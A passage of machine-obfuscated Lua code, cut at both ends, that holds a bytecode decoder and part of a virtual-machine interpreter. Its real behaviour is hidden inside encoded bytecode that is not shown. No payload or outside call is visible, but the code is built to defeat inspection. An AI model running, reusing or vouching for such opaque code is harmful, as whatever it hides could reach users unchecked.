or(cx%cc)>bw)then local bw=cv while true do bw=bw+ct if(bw==ct or bw<ct)then cx=(cx-bz)%by else if not(bw~=cs)then return cz(cy(da,cy,cy,(cz and da)),da(cz,cz,cy,(da and db)),da(cy,db,cy,da),(cy(da,(db and cz),cz and da,cy)and cy((da and db),da and cy,db,da)))else break end end end else local bw=cv while true do bw=bw+ct if not(bw~=cs)then break else return cy end end end return cz end,function(bw,by,ca,cc)if cw>bs then local bs=cv while true do bs=bs+ct if not(bs~=cs)then break else return bw end end end cw=cw+ct cx=((cx-bj)%bk)if((cx%bh)==bi or(cx%bh)>bi)then local bh=cv while true do bh=bh+ct if(bh==cs or bh>cs)then if(bh<bg)then return ca else break end else cx=(cx*bf)%y end end else local y=cv while true do y=(y+ct)if(y<cs)then return bw(by(cc and by,bw and by,(ca and bw),bw),(cc(by,cc,by,(ca and cc))and ca(ca,cc,ca,ca)),ca(cc,bw and cc,bw,cc)and by(bw,bw and bw,ca,by),ca(ca,cc,(by and cc),ca))else break end end end return bw(ca(ca,by,ca and bw,cc),cc(ca,ca,cc,bw),bw(cc,cc,by,bw),by(bw,(bw and bw),ca,cc))end,function(y,bf,bh,bi)if(cw>be)then local be=cv while true do be=be+ct if be<cs then return bi else break end end end cw=cw+ct cx=((cx+x)%w)if((cx%s)>v or(cx%s)==v)then local s=cv while true do s=(s+ct)if(s<ct or s==ct)then cx=((cx-bz)%q)else if not(s~=bg)then break else return bi end end end else local q=cv while true do q=(q+ct)if not(q~=cs)then break else return bh(y(bh,(y and bh),bf,bi),(bi(bh,y,bf,bh)and bf(bi,bi and bh,bf,bh and bi)),bh(bf,bh,y,bh),bf(bf,bi,bf,bf))end end end return y(bh(bf and bi,bf,bf and y,(bi and bh)),bi(y,bh,bi,bh),bi(bi and bh,(bh and bh),bf,bh),y(bh,bi,bf,bi))end,function(q,s,v,w)if cw>p then local p=cv while true do p=p+ct if p<cs then return w else break end end end cw=cw+ct cx=(cx*d)%c if((cx%b)>a)then local a=cv while true do a=a+ct if(a<cs)then return q(v(w,q,q,(s and v)),q(q,v,s,(s and q))and w(s,w,w,s),s(q,w,q,(v and q)),v(q,v,q,v)and q(s,v,q,(q and w)))else break end end else local a=cv while true do a=a+ct if not(a~=cs)then break else return s end end end return w end)return cx;end)());else ck=function()local a,b,c,d,p,q,s=0 while true do if a<=3 then if a<=1 then if 0==a then b,c=cf(),cf()else if not(b~=0)and(c==0)then return 0;end;end else if 2==a then d=1 else p=(cd(c,1,20)*((2^32)))+b end end else if a<=5 then if 4<a then s=(((-1)^cd(c,32)))else q=cd(c,21,31)end else if a<=6 then if(not(q~=0))then if(p==0)then return s*0;else q=1;d=0;end;elseif(not(q~=2047))then if(not(p~=0))then return(s*((1/0)));else return(s*(0/0));end;end;else if a~=8 then return(s*2^(q-1023)*(d+(p/(2^52))))else break end end end end a=a+1 end end end else if bd<=29 then cl="\46"else if 31~=bd then cm=function()local a,b,c=0 while true do if a<=1 then if a>0 then b,c=bu(b,cb),bu(c,cb);else b,c=h(bn,br,br+2)end else if a<=2 then br=(br+2);else if a>3 then break else return((bv(c,8))+b);end end end a=a+1 end end else cn=cf end end end else if bd<=33 then if bd==32 then co=function()local a,b,c,d,p=0 while true do if a<=2 then if a<=0 then b=g else if 1<a then d=0 else c=157 end end else if a<=3 then p={}else if a<5 then while d<8 do d=d+1;while((d<707)and(c%1622)<811)do c=(((c*35)))local q=d+c if((((c%16522))<8261))then c=((c*19))while(((d<828)and c%658<329))do c=((c+60))local q=d+c if((((c%18428))==9214 or(((c%18428))<9214)))then c=((c-50))local q=10701 if not p[q]then p[q]=1;local q,s=cn(),g;if not(not(q==0))then return g;end;b=j(bn,br,((br+q)-1));br=(br+q);return z(b,cl,function(q)local s,v=0 while true do if s<=0 then v=0 else if 2>s then while true do if(0<v)then break else return i(h(q))end v=v+1 end else break end end s=s+1 end end);end elseif((c%4~=0))then c=(c-67)local q=33140 if not p[q]then p[q]=1;return z(b,cl,function(q)local s,v=0 while true do if s<=0 then v=0 else if 2~=s then while true do if(v~=1)then return i(h(q))else break end v=v+1 end else break end end s=s+1 end end);end else c=(c*88)d=d+1 local q=92657 if not p[q]then p[q]=1;return z(b,cl,function(q)local s,v=0 while true do if s<=0 then v=0 else if 1==s then while true do if(1>v)then return i(h(q))else break end v=(v+1)end else break end end s=s+1 end end);end end;d=(d+1);end elseif not((c%4==0))then c=(c-48)while((d<859)and c%1392<696)do c=(c*39)local q=((d+c))if(c%58)<29 then c=(((c+5)))local q=33930 if not p[q]then p[q]=1;return z(b,cl,function(q)local s,v=0 while true do if s<=0 then v=0 else if 2~=s then while true do if(v>0)then break else return i(h(q))end v=(v+1)end else break end end s=s+1 end end);end elseif not(c%4==0)then c=(c*56)local q=35370 if not p[q]then p[q]=1;return z(b,cl,function(q)local s,v=0 while true do if s<=0 then v=0 else if 1==s then while true do if v>0 then break else return i(h(q))end v=(v+1)end else break end end s=s+1 end end);end else c=(((c*9)))d=d+1 local q=96267 if not p[q]then p[q]=1;return z(b,cl,function(q)local s,v=0 while true do if s<=0 then v=0 else if s~=2 then while true do if(1~=v)then return i(h(q))else break end v=v+1 end else break end end s=s+1 end end);end end;d=(d+1);end else c=(((c-51)))d=((d+1))while((d<663)and((c%936)<468))do c=(((c*12)))local q=(d+c)if(((c%18532)==9266 or(c%18532)>9266))then c=(c*71)local q=7037 if not p[q]then p[q]=1;return z(b,cl,function(q)local s,v=0 while true do if s<=0 then v=0 else if 2~=s then while true do if v>0 then break else return i(h(q))end v=(v+1)end else break end end s=s+1 end end);end elseif not(not((c%4)~=0))then c=((c-18))local q=90882 if not p[q]then p[q]=1;return z(b,cl,function(q)local s,v=0 while true do if s<=0 then v=0 else if 2~=s then while true do if not(1==v)then return i(h(q))else break end v=(v+1)end else break end end s=s+1 end end);end else c=(c*35)d=(d+1)local q=41573 if not p[q]then p[q]=1;return z(b,cl,function(b)local p,q=0 while true do if p<=0 then q=0 else if p==1 then while true do if(q==0)then return i(h(b))else break end q=q+1 end else break end end p=p+1 end end);end end;d=(d+1);end end;d=d+1;end c=(c-494)if((d>43))then break;end;end;else break end end end a=a+1 end end else cp=cf end else if bd<=34 then cq=function(...)local a=0 while true do if a==0 then return{...},n("\35",...)else break end a=a+1 end end else if 36>bd then cr=function()local a,b,c,d,p,q,s,v,w,x=0 while true do if a<=9 then if a<=4 then if a<=1 then if 1~=a then b,c,d,p={},{},{},{}else q=m({[ch]=b,nil,[ci]=c,nil,[776]=p,[345]=bb,[536]=nil},{['\95\95\116\111\115\116\114\105\110\103']=function(...)return j(bn,br,br);end,})end else if a<=2 then s={}else if a>3 then w=0 else v=490 end end end else if a<=6 then if a~=6 then x={}else while w<3 do w=(w+1);while((w<481 and v%320<160))do v=((v*62))local d=w+v if(((v%916))>458)then v=(((v-88)))while((w<318))and v%702<351 do v=((v*8))local d=(w+v)if((v%14064))>7032 then v=((v*81))local d=58084 if not x[d]then x[d]=1;s[cf()]=nil;end elseif v%4~=0 then v=((v*37))local d=93269 if not x[d]then x[d]=1;s[cf()]=nil;end else v=((v+10))w=((w+1))local d=78058 if not x[d]then x[d]=1;for d=1,cf()do local j=cg();if(not(not(j==0)))then s[d]=nil;elseif(not(not(j==3)))then s[d]=(not(cg()==0));elseif((not(j~=1)))then s[d]=ck();elseif(not((j~=2)))then s[d]=co();end;end;q[cj]=s;end end;w=w+1;end elseif not(not(((v%4))~=0))then v=(((v*65)))while w<615 and v%618<309 do v=((v-33))local d=(w+v)if(((v%15582)>7791))then v=(((v*14)))local d=31092 if not x[d]then x[d]=1;s[cf()]=nil;end elseif not(not((v%4)~=0))then v=(((v+51)))local d=68285 if not x[d]then x[d]=1;s[cf()]=nil;end else v=((v+53))w=(w+1)local d=64266 if not x[d]then x[d]=1;s[cf()]=nil;end end;w=((w+1));end else v=((v+7))w=w+1 while((w<127)and(v%1548)<774)do v=((v-37))local d=((w+v))if((v%19188)>9594)then v=(((v*61)))local d=73351 if not x[d]then x[d]=1;s[cf()]=nil;end elseif not((v%4==0))then v=((v+25))local d=78934 if not x[d]then x[d]=1;s[cf()]=nil;end else v=(((v+42)))w=((w+1))local d=62692 if not x[d]then x[d]=1;s[cf()]=nil;end end;w=((w+1));end end;w=(w+1);end v=(v*482)if w>56 then break;end;end;end else if a<=7 then q[481]=cg();else if 8==a then v=61 else w=0 end end end end else if a<=14 then if a<=11 then if 11~=a then x={}else while(w<8)do w=w+1;while(((w<252))and((v%1298)<649))do v=(v+17)local d=((w+v))if((v%13378)>=6689)then v=(((v+12)))while(w<197 and(((v%1092)<546)))do v=((v+1))local d=((w+v))if((v%10616)<=5308)then v=(v*19)local d=85723 if not x[d]then x[d]=1;end elseif((v%4~=0))then v=(((v+77)))local d=76999 if not x[d]then x[d]=1;end else v=((v-41))w=w+1 local d=60876 if not x[d]then x[d]=1;end end;w=w+1;end elseif((v%4~=0))then v=(((v*44)))while(w<580 and v%1430<715)do v=((v*54))local d=((w+v))if((v%984)<492)then v=(((v*96)))local d=56475 if not x[d]then x[d]=1;local d=1;local j=2;local p=3;local y=4;for y=1,cf()do local bb=cg();local be=cd(bb,d,d);if((not(be~=0)))then local bb,be,bf=cd(bb,j,p),cd(bb,4,6),m({[46]=cm(),[716]=cm(),nil,nil},{['\95\95\116\111\115\116\114\105\110\103']=function(...)return cd(bb,j,p);end,})if((((not(bb~=0)))or(not((bb~=d)))))then bf[424]=cf();if(not(((bb~=0))))then bf[676]=cf();end;elseif(bb==j)or(not(bb~=p))then bf[424]=(cf()-(e));if(not(not(bb==p)))then bf[676]=cm();end;end;if(not(((cd(be,d,d)~=d))))then bf[716]=s[bf[716]];end;if(not((cd(be,j,j)~=d)))then bf[424]=s[bf[424]];end;if(not(not(not(cd(be,p,p)~=d))))then bf[676]=s[bf[676]];end;b[y]=bf;end;end;end elseif not(not((v%4)~=0))then v=(((v+34)))local b=62072 if not x[b]then x[b]=1;end else v=(((v*62)))w=(w+1)local b=51342 if not x[b]then x[b]=1;end end;w=((w+1));end else v=((v+46))w=(w+1)while(w<843 and v%1086<543)do v=(((v*72)))local b=(w+v)if(((v%18352)<9176))then v=(v*63)local b=89669 if not x[b]then x[b]=1;end elseif not(v%4==0)then v=(((v*24)))local b=60582 if not x[b]then x[b]=1;end else v=(v+98)w=w+1 local b=83685 if not x[b]then x[b]=1;end end;w=(w+1);end end;w=(w+1);end v=(((v-460)))if(w>72)then break;end;end;end else if a<=12 then for b=1,cf()do c[(b-1)]=cr();end;else if a~=14 then do for b=1,#q[ch]do local b=q[ch][b]local c,d,e=b[716],b[424],b[676]if not(not(bp(c)==f))then c=z(c,cl,function(j,p,p)local p,s=0 while true do if p<=0 then s=0 else if 2~=p then while true do if 1>s then return i(bu(h(j),cb))else break end s=(s+1)end else break end end p=p+1 end end)b[716]=c end if not(((bp(d)~=f)))then d=z(d,cl,function(c,j,j,j)local j,p=0 while true do if j<=0 then p=0 else if j==1 then while true do if(1~=p)then return i(bu(h(c),cb))else break end p=p+1 end else break end end j=j+1 end end)b[424]=d end if not((not(bp(e)==f)))then e=z(e,cl,function(c,d,d,d,d)local d,j=0 while true do if d<=0 then j=0 else if d==1 then while true do if j==0 then return i(bu(h(c),cb))else break end j=j+1 end else break end end d=d+1 end end)b[676]=e end;end;q[cj]=nil;end;else v=461 end end end else if a<=16 then if a<16 then w=0 else x={}end else if a<=17 then while(w<6)do w=w+1;while((w<649)and v%58<29)do v=((v+51))local b=(w+v)if((((v%16654))<8327))then v=((v*38))while(w<408 and v%744<372)do v=(v*87)local b=w+v if((not((v%16082)~=8041)or(v%16082)<8041))then v=(((v+38)))local b=26340 if not x[b]then x[b]=1;return q end elseif(v%4~=0)then v=(((v-25)))local b=82630 if not x[b]then x[b]=1;return q end else v=(v+78)w=(w+1)local b=40591 if not x[b]then x[b]=1;return q end end;w=((w+1));end elseif not((v%4)==0)then v=((v+60))while w<353 and(v%1128<564)do v=(v+78)local b=(w+v)if(((v%12648)==6324 or(v%12648)>6324))then v=((v-84))local b=47391 if not x[b]then x[b]=1;return q end elseif(v%4~=0)then v=((v-80))local b=40703 if not x[b]then x[b]=1;return q end else v=(((v*94)))w=((w+1))local b=80897 if not x[b]then x[b]=1;return q end end;w=(w+1);end else v=(((v+10)))w=w+1 while(w<142 and v%1690<845)do v=((v*44))local b=w+v if((v%3746)==1873 or(v%3746)<1873)then v=(v+17)local b=75229 if not x[b]then x[b]=1;q[536]=function(...)local b,c,d,e,h=0 while true do if b<=0 then c,d,e,h=0 else if 2~=b then while true do if(c==2 or c<2)then if(c<=0)then d=n(1,...)else if 2>c then e=({...})else do for d=0,#e do if not(not(bp(e[d])==bq))then for i,i in o,e[d]do if not(not(bp(i)==bp(g)))then t(bo,i)end end else t(bo,e[d])end end end end end else if c<=3 then h=function(d)local i,j,p=0 while true do if i<=0 then j,p=0 else if 2>i then while true do if j<=1 then if not(0~=j)then p=u(d)else for p=0,#bo do if ba(d,bo[p])then return bm(f);end end end else if j<3 then return false else break end end j=j+1 end else break end end i=i+1 end end else if 4<c then break else for d=0,#e do if not(not(bp(e[d])==bq))then return h(e[d])end end end end end c=(c+1)end else break end end b=b+1 end end end elseif not(((v%4)==0))then v=(((v*81)))local b=57235 if not x[b]then x[b]=1;return q end else v=(((v-11)))w=(w+1)local b=1175 if not x[b]then x[b]=1;end end;w=w+1;end end;w=w+1;end v=(v-935)if(w>12)then break;end;end;else if a~=19 then return q;else break end end end end end a=a+1 end end else break end end end end end end bd=bd+1 end local function a(b,c)local d if bp(l)==bq then d=l;else d=l(bl);end local e={}for f,h in o,d do if h~=b then e[f]=h else e[f]=c;end end if bc then return bc(bl,e)else l=e;return l;end end;local function b(...)local c=n(bl,...);local d=c[ci];local e=c[536];local f=c[ch];local h=n(2,...);local i=c[345];local j=n(3,...);local o=c[481];local c=c[776];local c=bt[ba(bx,i)];return function(...)local i,n,p,q,s,u,v,w=cq,1,-1,{},{...},(n("\35",...)-1),{},{};for x=0,u,1 do if(x>=o)then q[x-o]=s[x+1];else w[x]=s[x+1];end;end;local x,y,z,ba=(u-o+1),nil,nil,{};while true do y=f[n];z=y[46];if 186>=z then if 92>=z then if z<=45 then if z<=22 then if 10>=z then if z<=4 then if z<=1 then if(0==z)then local ba,bb,bc,bd=0 while true do if ba<=9 then if ba<=4 then if ba<=1 then if ba~=1 then bb=nil else bc=nil end else if ba<=2 then bd=nil else if ba>3 then n=n+1;else w[y[716]]=h[y[424]];end end end else if ba<=6 then if ba~=6 then y=f[n];else w[y[716]]=h[y[424]];end else if ba<=7 then n=n+1;else if ba~=9 then y=f[n];else w[y[716]]=w[y[424]][y[676]];end end end end else if ba<=14 then if ba<=11 then if 11>ba then n=n+1;else y=f[n];end else if ba<=12 then w[y[716]]=w[y[424]][w[y[676]]];else if 13==ba then n=n+1;else y=f[n];end end end else if ba<=16 then if 16~=ba then bd=y[716]else bc={w[bd](w[bd+1])};end else if ba<=17 then bb=0;else if 18==ba then for be=bd,y[676]do bb=bb+1;w[be]=bc[bb];end else break end end end end end ba=ba+1 end else local ba,bb,bc,bd=0 while true do if ba<=9 then if ba<=4 then if ba<=1 then if 1~=ba then bb=nil else bc=nil end else if ba<=2 then bd=nil else if ba<4 then w[y[716]]=h[y[424]];else n=n+1;end end end else if ba<=6 then if ba>5 then w[y[716]]=h[y[424]];else y=f[n];end else if ba<=7 then n=n+1;else if ba~=9 then y=f[n];else w[y[716]]=w[y[424]][y[676]];end end end end else if ba<=14 then if ba<=11 then if 11>ba then n=n+1;else y=f[n];end else if ba<=12 then w[y[716]]=w[y[424]][w[y[676]]];else if 13==ba then n=n+1;else y=f[n];end end end else if ba<=16 then if 16~=ba then bd=y[716]else bc={w[bd](w[bd+1])};end else if ba<=17 then bb=0;else if 18==ba then for be=bd,y[676]do bb=bb+1;w[be]=bc[bb];end else break end end end end end ba=ba+1 end end;elseif 2>=z then local ba;w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=w[y[424]]*y[676];n=n+1;y=f[n];w[y[716]]=w[y[424]]+w[y[676]];n=n+1;y=f[n];w[y[716]]=j[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=w[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]]+w[y[676]];n=n+1;y=f[n];ba=y[716]w[ba]=w[ba](r(w,ba+1,y[424]))elseif z~=4 then local ba=y[716]w[ba](w[ba+1])else local ba;w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];ba=y[716]w[ba]=w[ba](r(w,ba+1,y[424]))end;elseif z<=7 then if 5>=z then local ba;local bb;local bc;w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=w[y[424]][w[y[676]]];n=n+1;y=f[n];bc=y[716]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[676]do ba=ba+1;w[bd]=bb[ba];end elseif z>6 then w={};for ba=0,u,1 do if ba<o then w[ba]=s[ba+1];else break;end;end;n=n+1;y=f[n];w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]={};n=n+1;y=f[n];w[y[716]]={};n=n+1;y=f[n];w[y[716]][y[424]]=w[y[676]];n=n+1;y=f[n];w[y[716]]=j[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];if w[y[716]]then n=n+1;else n=y[424];end;else local ba=y[716]w[ba](r(w,ba+1,p))end;elseif 8>=z then local ba,bb,bc,bd=0 while true do if ba<=9 then if ba<=4 then if ba<=1 then if ba~=1 then bb=nil else bc=nil end else if ba<=2 then bd=nil else if 4>ba then w[y[716]]=h[y[424]];else n=n+1;end end end else if ba<=6 then if ba~=6 then y=f[n];else w[y[716]]=h[y[424]];end else if ba<=7 then n=n+1;else if 8==ba then y=f[n];else w[y[716]]=w[y[424]][y[676]];end end end end else if ba<=14 then if ba<=11 then if 11>ba then n=n+1;else y=f[n];end else if ba<=12 then w[y[716]]=w[y[424]][w[y[676]]];else if 13==ba then n=n+1;else y=f[n];end end end else if ba<=16 then if ba>15 then bc={w[bd](w[bd+1])};else bd=y[716]end else if ba<=17 then bb=0;else if 19>ba then for be=bd,y[676]do bb=bb+1;w[be]=bc[bb];end else break end end end end end ba=ba+1 end elseif z<10 then local ba;w[y[716]]=j[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];ba=y[716]w[ba]=w[ba](w[ba+1])else local ba;w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];ba=y[716]w[ba]=w[ba](r(w,ba+1,y[424]))end;elseif 16>=z then if 13>=z then if z<=11 then local ba=y[716]w[ba](r(w,ba+1,p))elseif 13>z then local ba;w[y[716]]=j[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];ba=y[716]w[ba]=w[ba](r(w,ba+1,y[424]))else w[y[716]][y[424]]=y[676];n=n+1;y=f[n];w[y[716]]={};n=n+1;y=f[n];w[y[716]][y[424]]=w[y[676]];n=n+1;y=f[n];w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]][y[424]]=w[y[676]];n=n+1;y=f[n];w[y[716]][y[424]]=w[y[676]];end;elseif 14>=z then local ba;local bb;local bc;w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=w[y[424]];n=n+1;y=f[n];w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];bc=y[424];bb=y[676];ba=k(w,g,bc,bb);w[y[716]]=ba;elseif z<16 then local ba;local bb;local bc;w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=w[y[424]][w[y[676]]];n=n+1;y=f[n];bc=y[716]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[676]do ba=ba+1;w[bd]=bb[ba];end else local ba;w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];ba=y[716]w[ba]=w[ba](r(w,ba+1,y[424]))end;elseif z<=19 then if z<=17 then local ba=d[y[424]];local bb={};local bc={};for bd=1,y[676]do n=n+1;local be=f[n];if be[46]==43 then bc[bd-1]={w,be[424]};else bc[bd-1]={h,be[424]};end;v[#v+1]=bc;end;m(bb,{['\95\95\105\110\100\101\120']=function(bd,bd)local bd=bc[bd];return bd[1][bd[2]];end,['\95\95\110\101\119\105\110\100\101\120']=function(bd,bd,be)local bc=bc[bd]bc[1][bc[2]]=be;end;});w[y[716]]=b(ba,bb,j);elseif 18<z then w={};for ba=0,u,1 do if ba<o then w[ba]=s[ba+1];else break;end;end;n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=w[y[424]][w[y[676]]];n=n+1;y=f[n];if(w[y[716]]~=y[676])then n=n+1;else n=y[424];end;else local ba;w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];ba=y[716]w[ba]=w[ba](r(w,ba+1,y[424]))end;elseif z<=20 then local ba;w={};for bb=0,u,1 do if bb<o then w[bb]=s[bb+1];else break;end;end;n=n+1;y=f[n];w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=j[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];ba=y[716]w[ba]=w[ba](r(w,ba+1,y[424]))elseif 21==z then local ba;w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];ba=y[716]w[ba]=w[ba](r(w,ba+1,y[424]))else local ba;local bb;local bc;w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=w[y[424]][w[y[676]]];n=n+1;y=f[n];bc=y[716]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[676]do ba=ba+1;w[bd]=bb[ba];end end;elseif z<=33 then if(27==z or 27>z)then if(z==24 or z<24)then if(z<24)then local ba=y[716]w[ba]=w[ba]()else w[y[716]][y[424]]=y[676];end;elseif(25>z or 25==z)then local ba=y[716];local bb=w[ba];for bc=ba+1,y[424]do t(bb,w[bc])end;elseif(27~=z)then h[y[424]]=w[y[716]];else w[y[716]]=(w[y[424]]+w[y[676]]);end;elseif z<=30 then if(z<28 or z==28)then if(w[y[716]]<=w[y[676]])then n=y[424];else n=n+1;end;elseif not(z==30)then local ba,bb=0 while true do if ba<=7 then if ba<=3 then if ba<=1 then if 1~=ba then bb=nil else w[y[716]]=h[y[424]];end else if 3>ba then n=n+1;else y=f[n];end end else if ba<=5 then if 5~=ba then w[y[716]]=y[424];else n=n+1;end else if ba>6 then w[y[716]]=y[424];else y=f[n];end end end else if ba<=11 then if ba<=9 then if 9>ba then n=n+1;else y=f[n];end else if ba<11 then w[y[716]]=y[424];else n=n+1;end end else if ba<=13 then if ba<13 then y=f[n];else bb=y[716]end else if 15>ba then w[bb]=w[bb](r(w,bb+1,y[424]))else break end end end end ba=ba+1 end else local ba=0 while true do if ba<=7 then if ba<=3 then if ba<=1 then if ba<1 then w[y[716]]=w[y[424]][y[676]];else n=n+1;end else if 3~=ba then y=f[n];else w[y[716]][y[424]]=w[y[676]];end end else if ba<=5 then if 4==ba then n=n+1;else y=f[n];end else if ba==6 then w[y[716]]=w[y[424]][y[676]];else n=n+1;end end end else if ba<=11 then if ba<=9 then if ba<9 then y=f[n];else w[y[716]]=h[y[424]];end else if ba==10 then n=n+1;else y=f[n];end end else if ba<=13 then if 13>ba then w[y[716]]=w[y[424]][y[676]];else n=n+1;end else if ba<=14 then y=f[n];else if ba==15 then if(w[y[716]]~=w[y[676]])then n=n+1;else n=y[424];end;else break end end end end end ba=ba+1 end end;elseif(31==z or 31>z)then local ba,bb,bc,bd=0 while true do if ba<=15 then if ba<=7 then if ba<=3 then if ba<=1 then if 0==ba then bb=nil else bc=nil end else if 3>ba then bd=nil else w[y[716]]=h[y[424]];end end else if ba<=5 then if 5~=ba then n=n+1;else y=f[n];end else if ba~=7 then w[y[716]]=w[y[424]][y[676]];else n=n+1;end end end else if ba<=11 then if ba<=9 then if ba>8 then w[y[716]]=h[y[424]];else y=f[n];end else if ba>10 then y=f[n];else n=n+1;end end else if ba<=13 then if 12<ba then n=n+1;else w[y[716]]=w[y[424]][y[676]];end else if ba<15 then y=f[n];else w[y[716]]=w[y[424]][w[y[676]]];end end end end else if ba<=23 then if ba<=19 then if ba<=17 then if ba~=17 then n=n+1;else y=f[n];end else if 19~=ba then w[y[716]]=h[y[424]];else n=n+1;end end else if ba<=21 then if ba==20 then y=f[n];else w[y[716]]=w[y[424]][y[676]];end else if ba==22 then n=n+1;else y=f[n];end end end else if ba<=27 then if ba<=25 then if ba==24 then w[y[716]]=w[y[424]][y[676]];else n=n+1;end else if 26==ba then y=f[n];else bd=y[424];end end else if ba<=29 then if ba<29 then bc=y[676];else bb=k(w,g,bd,bc);end else if ba>30 then break else w[y[716]]=bb;end end end end end ba=ba+1 end elseif z==32 then local ba,bb,bc,bd=0 while true do if ba<=9 then if ba<=4 then if ba<=1 then if 1~=ba then bb=nil else bc=nil end else if ba<=2 then bd=nil else if 3==ba then w[y[716]]=h[y[424]];else n=n+1;end end end else if ba<=6 then if 5==ba then y=f[n];else w[y[716]]=h[y[424]];end else if ba<=7 then n=n+1;else if 9>ba then y=f[n];else w[y[716]]=w[y[424]][y[676]];end end end end else if ba<=14 then if ba<=11 then if ba<11 then n=n+1;else y=f[n];end else if ba<=12 then w[y[716]]=w[y[424]][w[y[676]]];else if ba~=14 then n=n+1;else y=f[n];end end end else if ba<=16 then if 15<ba then bc={w[bd](w[bd+1])};else bd=y[716]end else if ba<=17 then bb=0;else if ba>18 then break else for be=bd,y[676]do bb=bb+1;w[be]=bc[bb];end end end end end end ba=ba+1 end else local ba=0 while true do if ba<=6 then if ba<=2 then if ba<=0 then w[y[716]]=w[y[424]][y[676]];else if ba~=2 then n=n+1;else y=f[n];end end else if ba<=4 then if ba~=4 then w[y[716]]=w[y[424]][y[676]];else n=n+1;end else if ba>5 then w[y[716]]=w[y[424]][y[676]];else y=f[n];end end end else if ba<=9 then if ba<=7 then n=n+1;else if 8<ba then w[y[716]]=w[y[424]][y[676]];else y=f[n];end end else if ba<=11 then if ba==10 then n=n+1;else y=f[n];end else if 12==ba then if w[y[716]]then n=n+1;else n=y[424];end;else break end end end end ba=ba+1 end end;elseif z<=39 then if 36>=z then if(z<=34)then local ba,bb,bc,bd=0 while true do if(ba<9 or ba==9)then if(ba==4 or ba<4)then if ba<=1 then if(0<ba)then bc=nil else bb=nil end else if(ba<2 or ba==2)then bd=nil else if not(ba~=3)then w[y[716]]=h[y[424]];else n=n+1;end end end else if(ba<=6)then if ba<6 then y=f[n];else w[y[716]]=h[y[424]];end else if(ba<=7)then n=n+1;else if not(8~=ba)then y=f[n];else w[y[716]]=w[y[424]][y[676]];end end end end else if ba<=14 then if ba<=11 then if(ba~=11)then n=n+1;else y=f[n];end else if(ba==12 or ba<12)then w[y[716]]=w[y[424]][w[y[676]]];else if not(ba==14)then n=(n+1);else y=f[n];end end end else if(ba<16 or ba==16)then if not(ba==16)then bd=y[716]else bc={w[bd](w[bd+1])};end else if(ba==17 or ba<17)then bb=0;else if(18<ba)then break else for be=bd,y[676]do bb=(bb+1);w[be]=bc[bb];end end end end end end ba=ba+1 end elseif not(z~=35)then w[y[716]]=w[y[424]]%w[y[676]];else if w[y[716]]then n=n+1;else 